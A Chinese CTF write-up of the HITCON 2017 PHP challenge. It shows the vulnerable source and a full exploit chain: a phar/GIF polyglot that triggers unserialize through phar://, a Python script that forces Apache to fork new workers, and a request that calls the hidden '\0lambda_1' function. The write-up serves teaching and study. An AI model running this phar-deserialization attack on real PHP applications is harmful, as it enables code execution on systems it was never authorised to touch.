分享本题自制Dockerfile : [Github](https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017)

这题在比赛过程是0解......真的太难了...体现了Orange大大对php和中间件的深刻理解Orz 膜拜

题目源码:
```php
<?php
$FLAG = create_function("", 'die(`/read_flag`);');
$SECRET = `/read_secret`;
$SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
@mkdir($SANDBOX);
@chdir($SANDBOX);

if (!isset($_COOKIE["session-data"])) {
	$data = serialize(new User($SANDBOX));
	$hmac = hash_hmac("sha1", $data, $SECRET);
	setcookie("session-data", sprintf("%s-----%s", $data, $hmac));
}

class User {
	public $avatar;
	function __construct($path) {
		$this->avatar = $path;
	}
}

#######################key class################################
class Admin extends User {
	function __destruct() {
		$random = bin2hex(openssl_random_pseudo_bytes(32));
		eval("function my_function_$random() {"
			. "  global \$FLAG; \$FLAG();"
			. "}");
		$_GET["lucky"]();
	}
}
#######################key class################################
function check_session() {
	global $SECRET;
	$data = $_COOKIE["session-data"];
	list($data, $hmac) = explode("-----", $data, 2); #从cookie中取出data和hmac签名
	if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) #判空
	{
		die("Bye");
	}

	if (!hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac)) #判断data加密之后和hmac签名是否对应
	{
		die("Bye Bye");
	}

	$data = unserialize($data); #反序列化
	if (!isset($data->avatar)) #如果反序列化之后的data包含的类中无avatar成员,退出
	{
		die("Bye Bye Bye");
	}

	return $data->avatar;
}

function upload($path) {
	$data = file_get_contents($_GET["url"] . "/avatar.gif");
	if (substr($data, 0, 6) !== "GIF89a") {
		die("Fuck off");
	}

	file_put_contents($path . "/avatar.gif", $data);
	die("Upload OK");
}

function show($path) {
	if (!file_exists($path . "/avatar.gif")) {
		$path = "/var/www/html";
	}

	header("Content-Type: image/gif");
	die(file_get_contents($path . "/avatar.gif"));
}

$mode = $_GET["m"];
if ($mode == "upload") {
	upload(check_session()); #从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中
} else if ($mode == "show") {
	show(check_session()); #从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif
} else {
	highlight_file(__FILE__);
}
```
思路:
- 首先分析代码, 首先分配了一个匿名函数给flag变量, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个匿名函数
- 题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif
- 一开始的想法是 -----> admin是关键类,需要通过反序列化之后的析构函数去触发其中的eval -----> 通过lucky参数去调用这个输出flag的函数. 而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 基本上无法伪造.....所以放弃这个想法
- 咋一看好像代码里面并没有其他能够反序列化的地方了, 然后就来到了本题的第一个考点--php中解析Phar归档中的Metadata的时候可能会有反序列化的操作, 文档中描述的Phar::getMetadata操作(http://php.net/manual/zh/phar.getmetadata.php)
> - Phar?(方便开发者打包和发布php应用的类似于Java中的Jar的一种文件)
> ![What is Phar?(官方文档)](http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
> - Phar归档的结构
> ![Phar(官方文档)](http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
> - Metadata : Phar归档中可用来描述此文档的一段序列化之后的字符串![usage of Metadata(官方文档)](http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
> - phar_parse_metadata的初始化调用, 具体PHP源码在ext/phar/phar.c
执行流程大致为: 
....--> phar_open_from_filename(1512行的php_stream_open_wrapper函数可以得知此函数处理phar://打开本地phar文件 1531行调用下一个函数)![phar_open_from_filename](http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
--> phar_open_from_fp(1727行调用下一个函数)
![phar_open_from_fp](http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
--> phar_parse_pharfile(1038、1122行调用下一个函数)
![1038行](http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![1122行](http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
--> phar_parse_metadata(函数在609行)
![phar_parse_metadata函数](http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

- 而且题目内upload操作提供了``file_get_content()``函数 其中地址可控,可以利用``phar://``协议读取本地phar文件(phar协议不支持远程文件[The *phar* stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.
](http://php.net/manual/zh/phar.using.stream.php)),也就是说只要构造一个phar利用upload写到服务器目录, 其中metadata设置为Admin对象,就可以进入Admin的析构函数了
- 接下来的问题就是如何猜出那个随机数?
答案是基本上猜不出来https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php openssl_random_pseudo_bytes是加密级别的伪随机数生成器https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator 这是题目第二个死胡同
- 然后就到了题目的第二个考点, 匿名函数其实是有真正的名字 从注册匿名函数的源码(Zend/zend_builtin_functions.c 1854行) 大佬还对这个逻辑戏谑了一番 ![anonymous_functions_has_name](http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![name_of_anonymous_functions](http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
首先名字第一个字符被替换成了\0,也就是空字符 ,然后do操作将lambda_%d中的%d格式化成匿名函数的个数+1(从1开始)
所以最后得出的匿名函数的真正名字为:\0lambda_%d(%d格式化为当前进程的第n个匿名函数)
- 但是我们并不能知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数; 最后就引出了最后一个考点, Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求(这里猜测Orange大大应该修改了默认的0,因为0为永不kill掉子进程 这样就无法fork出新进程了) 在这个新进程里面匿名函数就会是从1开始的了

最后步骤分别是:
1. 先生成符合要求的phar放入自己的vps中, 生成代码为
```php
<?php
class Admin{
 public $avatar = 'xxx';
}
$p = new Phar(__DIR__.'/avatar.phar',0);
$p['file.php'] = '<?php ?>';
$p->setMetadata(new Admin());
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
rename(__DIR__.'/avatar.phar',__DIR__.'/avatar.gif');
?>
```
2. 再请求``?m=upload&url=http://xxx.xxx.xxx.xxx``
3. 启动Orange大大写的fork脚本
```python
# coding: UTF-8
# Author: orange@chroot.org
# 

import requests
import socket
import time
from multiprocessing.dummy import Pool as ThreadPool
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

def run(i):
    while 1:
        HOST = '127.0.0.1'
        PORT = 12344
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.sendall('GET / HTTP/1.1\nHost: 127.0.0.1\nConnection: Keep-Alive\n\n')
        # s.close()
        print 'ok'
        time.sleep(0.5)

i = 8
pool = ThreadPool( i )
result = pool.map_async( run, range(i) ).get(0xffff)
```
4. 请求``?m=upload&url=phar:///var/www/data/xxx&lucky=%00lambda_1``得到flag
![flag](http://upload-images.jianshu.io/upload_images/6949366-f60a8a6d06cfe6e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


参考:
https://github.com/orangetw/My-CTF-Web-Challenges
P神的小秘圈分享
http://php.net/manual/zh/book.phar.php
http://blog.jobbole.com/91920/
https://yq.aliyun.com/ziliao/55320
https://www.zhihu.com/question/23786410